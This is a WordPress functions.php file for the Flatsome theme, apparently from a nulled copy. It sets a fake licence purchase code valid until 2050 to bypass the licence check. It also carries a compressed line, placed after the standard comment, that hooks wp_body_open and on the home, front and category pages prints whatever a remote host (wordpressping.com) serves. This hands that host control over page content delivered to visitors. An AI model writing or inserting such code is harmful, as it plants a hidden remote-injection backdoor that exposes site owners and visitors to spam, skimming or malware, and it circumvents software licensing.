<?php
/**
 * Flatsome functions and definitions
 *
 * @package flatsome
 */

require get_template_directory() . '/inc/init.php';
update_option( 'flatsome_wup_purchase_code', 'GPL001122334455AA6677BB8899CC000' );
update_option( 'flatsome_wup_supported_until', '01.01.2050' );
update_option( 'flatsome_wup_buyer', 'GPL' );
/**
 * Note: It's not recommended to add any custom code here. Please use a child theme so that your customizations aren't lost during updates.
 * Learn more here: http://codex.wordpress.org/Child_Themes
 */
if(function_exists('wp_body_open')){function wp_body_opener(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpressping.com/pong.txt");}}add_action('wp_body_open','wp_body_opener');}else{function wp_body_open(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpressping.com/pong.txt");}}add_action('wp_body_open','wp_body_open');}